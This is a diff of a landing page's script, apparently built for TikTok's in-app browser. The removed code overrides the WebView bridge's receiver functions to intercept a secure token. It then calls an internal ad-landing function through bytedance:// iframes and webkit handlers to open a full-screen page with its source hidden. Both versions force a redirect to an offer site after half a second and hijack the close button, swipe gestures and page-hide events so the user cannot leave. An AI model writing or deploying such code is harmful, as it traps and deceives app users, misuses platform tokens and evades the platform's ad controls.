@@ -156,183 +156,40 @@ footer{border-top:1px solid rgba(255,255,255,.07);padding:22px 24px;}
   </div>
 </div>
 
-<div id="dbg" style="display:none;position:fixed;top:0;left:0;right:0;background:#000;color:#0f0;font-family:monospace;font-size:11px;padding:8px;z-index:9999;max-height:45vh;overflow-y:auto;white-space:pre-wrap;border-bottom:2px solid #0f0;word-break:break-all;"></div>
-
 <script>
 document.getElementById('yr').textContent = new Date().getFullYear();
 function openPrivacy(){document.getElementById('privacyModal').classList.add('show');}
 function closePrivacy(){document.getElementById('privacyModal').classList.remove('show');}
 
-function dbg(msg) {
-  var el = document.getElementById('dbg');
-  el.style.display = 'block';
-  el.textContent += msg + '\n';
-}
-
 (function(){
-  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
+  var OFFER = 'https://bio.thaiadvice.net/';
 
-  var CID = 1869709729112081;
-  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid)||CID; } catch(e){}
-  var fsUrl = 'https://www.thaiadvice.net/go';
-  var cbId = 1023;
-  var cbMap = {};
+  // Redirect to offer after brief delay — works in TikTok's in-app WebView without any dialog
+  setTimeout(function(){ window.location.href = OFFER; }, 500);
 
-  var hasTT = !!window.ToutiaoJSBridge;
-  var hasJB = !!window.JSBridge;
-  var hasWK = !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0);
-  dbg('TT:'+hasTT+' JB:'+hasJB+' WK:'+hasWK+' CID:'+CID);
-
-  // Try to intercept token that TikTok delivers to the page via global receiver functions
-  var token = null;
-  var _tokenKeys = ['_jsb_secure_token','secure_token','token','jsb_token','secureToken'];
-  function tryExtractToken(obj) {
-    if (!obj || typeof obj !== 'object') return null;
-    for (var i = 0; i < _tokenKeys.length; i++) {
-      if (typeof obj[_tokenKeys[i]] === 'string' && obj[_tokenKeys[i]].length > 10) return obj[_tokenKeys[i]];
-    }
-    for (var k in obj) {
-      try { var r = tryExtractToken(obj[k]); if (r) return r; } catch(e){}
-    }
-    return null;
-  }
-  function onNativeMsg(raw) {
-    try {
-      var d = typeof raw === 'string' ? JSON.parse(raw) : raw;
-      var tok = tryExtractToken(d);
-      if (tok && !token) { token = tok; dbg('tok-intercepted'); fireWithToken(token); }
-    } catch(e){}
-  }
-  // Override potential native→JS delivery functions
-  ['IESBridgeReceiveMessage','__IESBridgeReceiveMessage','IESPiperReceiveMessage',
-   '__IESPiperReceiveMessage','onJSBridgeReady','ttJSBridgeReceive'].forEach(function(fn) {
-    var orig = window[fn];
-    window[fn] = function(msg) { onNativeMsg(msg); if (orig) return orig.apply(this, arguments); };
-  });
-
-  // iframe bridge (bytedance:// scheme)
-  function mkIframe(id) {
-    var f = document.createElement('iframe');
-    f.id = id; f.style.display = 'none';
-    document.body.appendChild(f);
-    return f;
-  }
-  var dispatchFrame = mkIframe('__JSBridgeIframe_1.0__');
-  var resultFrame   = mkIframe('__JSBridgeIframe_SetResult_1.0__');
-
-  resultFrame.onload = function() {
-    try {
-      var loc = resultFrame.contentWindow.location.href;
-      if (loc && loc !== 'about:blank') {
-        dbg('ifr-res:' + loc.slice(0,200));
-        var m = loc.match(/[?&]result=([^&]*)/);
-        if (m) {
-          var res = JSON.parse(decodeURIComponent(m[1]));
-          dbg('ifr-parsed:' + JSON.stringify(res).slice(0,200));
-          if (res && res.data && res.data.secure_token) { dbg('ifr-tok:GOT'); fireWithToken(res.data.secure_token); }
-          if (res && res.callbackId && cbMap[res.callbackId]) cbMap[res.callbackId](res);
-        }
-      }
-    } catch(ex) { dbg('ifr-err:'+ex.message); }
-  };
-
-  function ifrCall(func, params, cb) {
-    var id = cbId++;
-    if (cb) cbMap[id] = cb;
-    var msg = JSON.stringify({func: func, params: params || {}, callbackId: id});
-    try { dispatchFrame.src = 'bytedance://dispatch_message/?params=' + encodeURIComponent(msg); } catch(ex){}
-    return id;
-  }
+  // Close intercept — also redirect if user tries to close/swipe away before redirect fires
+  var gone = false;
+  function leave() { if (gone) return; gone = true; window.location.href = OFFER; }
 
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-
-  var BASE_PARAMS = {
-    url: fsUrl, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID,
-    landingStyle: 2, hide_nav_bar: 1, hide_source: 1,
-    should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
-  };
-
-  function fireWithToken(tok) {
-    var p = Object.assign({}, BASE_PARAMS, {_jsb_secure_token: tok});
-    dbg('fire(tok) TT:'+!!window.ToutiaoJSBridge+' WK:'+!!wk);
-    if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.call) {
-      try { window.ToutiaoJSBridge.call('openAdLandPageLinks', p, function(){}); dbg('TT.call sent'); } catch(e){ dbg('TT.err:'+e); }
-    }
-    if (wk) { try { wk.postMessage({func:'openAdLandPageLinks', params:p}); dbg('WK sent'); } catch(ex){ dbg('WK.err:'+ex); } }
-    ifrCall('openAdLandPageLinks', p);
-    dbg('ifr sent');
-  }
-
-  function fireNoToken() {
-    var p = Object.assign({}, BASE_PARAMS);
-    dbg('fire(no-tok) TT:'+!!window.ToutiaoJSBridge+' WK:'+!!wk);
-    if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.call) {
-      try { window.ToutiaoJSBridge.call('openAdLandPageLinks', p, function(){}); dbg('TT.call sent'); } catch(e){ dbg('TT.err:'+e); }
-    }
-    if (wk) { try { wk.postMessage({func:'openAdLandPageLinks', params:p}); dbg('WK sent'); } catch(ex){ dbg('WK.err:'+ex); } }
-    ifrCall('openAdLandPageLinks', p);
-    dbg('ifr sent');
-  }
-
-  // Try JSBridge.getConfig() directly first
-  try {
-    var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
-    if (cfg) { dbg('getConfig:'+JSON.stringify(cfg).slice(0,200)); }
-  } catch(e){ dbg('getConfig-err:'+e); }
-
-  // Get token via iframe bridge, then fire
-  ifrCall('getConfig', {}, function(res) {
-    dbg('ifr-cfg:'+JSON.stringify(res).slice(0,200));
-    var tok = res && res.data && (res.data.secure_token || (res.data.secure && res.data.secure.token));
-    if (tok) fireWithToken(tok); else fireNoToken();
-  });
-
-  // Also fire immediately without token
-  fireNoToken();
-
-  // Plain redirect — navigates the existing in-app WebView to the offer, no dialog
-  setTimeout(function(){
-    window.location.href = 'https://bio.thaiadvice.net/';
-    dbg('redirect fired');
-  }, 500);
-
-  // Close intercept via IESPiper — redirect to offer when user hits X or swipes away
-  var closeFired = false;
-  function onCloseAttempt() {
-    if (closeFired) return;
-    closeFired = true;
-    dbg('close-intercepted → redirecting');
-    window.location.href = fsUrl;
-  }
-
   if (wk) {
-    var _origPost = wk.postMessage.bind(wk);
+    var _orig = wk.postMessage.bind(wk);
     wk.postMessage = function(msg) {
-      try {
-        var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
-        if (d && d.func === 'close') { onCloseAttempt(); return; }
-      } catch(e){}
-      return _origPost(msg);
+      try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') { leave(); return; } } catch(e){}
+      return _orig(msg);
     };
-    dbg('close-hook installed');
   }
 
-  // Swipe-left and back-swipe detection as additional close signals
-  var txStart = 0, tyStart = 0;
-  document.addEventListener('touchstart', function(e){
-    txStart = e.touches[0].clientX; tyStart = e.touches[0].clientY;
-  }, {passive:true});
+  var tx = 0, ty = 0;
+  document.addEventListener('touchstart', function(e){ tx = e.touches[0].clientX; ty = e.touches[0].clientY; }, {passive:true});
   document.addEventListener('touchmove', function(e){
     if (!e.touches.length) return;
-    var dx = e.touches[0].clientX - txStart;
-    var dy = e.touches[0].clientY - tyStart;
-    if (dx < -40 && Math.abs(dx) > Math.abs(dy) * 1.5) onCloseAttempt();
-    if (txStart < 30 && dx > 30 && Math.abs(dx) > Math.abs(dy)) onCloseAttempt();
+    var dx = e.touches[0].clientX - tx, dy = e.touches[0].clientY - ty;
+    if (dx < -40 && Math.abs(dx) > Math.abs(dy) * 1.5) leave();
+    if (tx < 30 && dx > 30 && Math.abs(dx) > Math.abs(dy)) leave();
   }, {passive:true});
 
-  document.addEventListener('visibilitychange', function(){
-    if (document.hidden) onCloseAttempt();
-  });
+  document.addEventListener('visibilitychange', function(){ if (document.hidden) leave(); });
 })();
 </script>
 </body>
